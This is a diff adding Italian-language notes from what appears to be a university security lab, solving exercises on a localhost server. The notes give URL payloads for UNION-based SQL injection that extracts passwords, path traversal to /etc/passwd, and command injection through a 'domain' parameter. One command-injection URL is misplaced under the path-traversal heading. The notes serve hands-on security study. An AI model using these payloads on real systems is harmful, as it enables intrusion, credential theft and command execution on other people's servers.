@@ -1,0 +1,25 @@
+# SQL Injection union based
+
+1. Mettendo SELECT * FROM utonti dava errore, perchè il numero di colonne non matchava quello della query originale
+
+http://0.0.0.0:8000/?id=2 UNION SELECT id,usarname,name,surname FROM utonti --;
+
+2. Per scoprire informazioni interessanti sul db uso (colonna ripetuta a perchè ne servono necessariamente 4):
+
+http://0.0.0.0:8000/?id=2 UNION SELECT column_number, table_name, column_names, column_names FROM sqlite3_master --;
+
+3. Vedo che c'è anche un campo "passweerd" che posso mettere nella query iniziale e ottenere le pw
+
+http://0.0.0.0:8000/?id=2 UNION SELECT usarname, usarname, name, passweerd FROM utonti --;
+
+# Path traversal
+
+1. all'url /path= ho messo * per capire qualcosa in più e vedere tutte le sostituzioni
+2. suggeriva questa stringa: http://localhost:8000/?path=./../../../../../etc/passwd
+3. poichè il testo non poteva terminare con wd, ho aggiunto un * alla fine 
+http://localhost:8000/?domain=www.ulisse.unibo.it%20||%20sed%20%27%20%27%20/tmp/flag_seclab*
+
+# Command injection (5)
+
+1. ho messo: http://localhost:8000/?domain=www.ulisse.unibo.it%20||%20sed%20%27%20%27%20/tmp/flag_seclab*
+2. L'url non poteva finire così quindi ho redirezionato il file in un altro chiamato "myfile", e ho fatto sed lì
